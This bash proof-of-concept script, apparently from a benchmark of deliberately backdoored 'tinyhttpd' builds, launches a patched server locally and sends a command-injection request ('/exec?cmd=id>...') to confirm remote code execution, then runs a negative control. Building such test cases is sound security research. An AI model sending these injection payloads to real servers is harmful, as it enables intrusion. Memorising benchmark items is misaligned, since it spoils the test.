#!/usr/bin/env bash
# PoC for 009_tinyhttpd_C1I3S3
# Axes: C1 (single CLI flag gate) / I3 (struct dispatch) / S3 (strict check, bypassed by omitting --strict-exec)
#
# Usage: ./PoC.sh
# Expected: prints uid= line confirming RCE as the server process user.
#
# The patched binary (httpd) lives in this directory. If it is absent,
# run:  cd $(dirname $0) && bash build.sh

set -euo pipefail

SAMPLE_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
BINARY="$SAMPLE_DIR/httpd"
WWWROOT="/tmp/poc_009_www"
MARKER="/tmp/poc_009_marker"
PORT=18009

if [[ ! -x "$BINARY" ]]; then
    echo "[-] binary not found at $BINARY — run build.sh first" >&2
    exit 1
fi

SERVER_PID=0

cleanup() {
    [[ $SERVER_PID -ne 0 ]] && { kill "$SERVER_PID" 2>/dev/null || true; wait "$SERVER_PID" 2>/dev/null || true; }
    rm -rf "$WWWROOT" "$MARKER"
}
trap cleanup EXIT

mkdir -p "$WWWROOT/htdocs"

# ── start server ───────────────────────────────────────────────────────────────
echo "[*] starting httpd with --exec-mode on port $PORT..."
# S3 bypass: --strict-exec is NOT passed (strict sanitization disabled)
(cd "$WWWROOT" && "$BINARY" --port "$PORT" --exec-mode) &
SERVER_PID=$!
sleep 1

# ── trigger ────────────────────────────────────────────────────────────────────
echo "[*] sending payload: cmd=id>/tmp/poc_009_marker"
curl -sf "http://127.0.0.1:${PORT}/exec?cmd=id>/tmp/poc_009_marker" > /dev/null

# ── verify ─────────────────────────────────────────────────────────────────────
if [[ -f "$MARKER" ]]; then
    echo "[+] RCE confirmed. Server executed:"
    cat "$MARKER"
else
    echo "[-] marker file not found — exploit failed"
    exit 1
fi

# ── negative control: endpoint absent without gate flags ───────────────────────
echo "[*] verifying gate: endpoint must be absent without gate flags (omitting --exec-mode)..."
(cd "$WWWROOT" && "$BINARY" --port 19009 ) &
SAFE_PID=$!
sleep 1
HTTP_CODE=$(curl -sf -o /dev/null -w "%{http_code}" \
    "http://127.0.0.1:19009/exec?cmd=id" || true)
kill "$SAFE_PID" 2>/dev/null; wait "$SAFE_PID" 2>/dev/null || true
if [[ "$HTTP_CODE" == "404" ]]; then
    echo "[+] gate check passed: got 404 without gate flags"
else
    echo "[!] gate check unexpected response: $HTTP_CODE"
fi
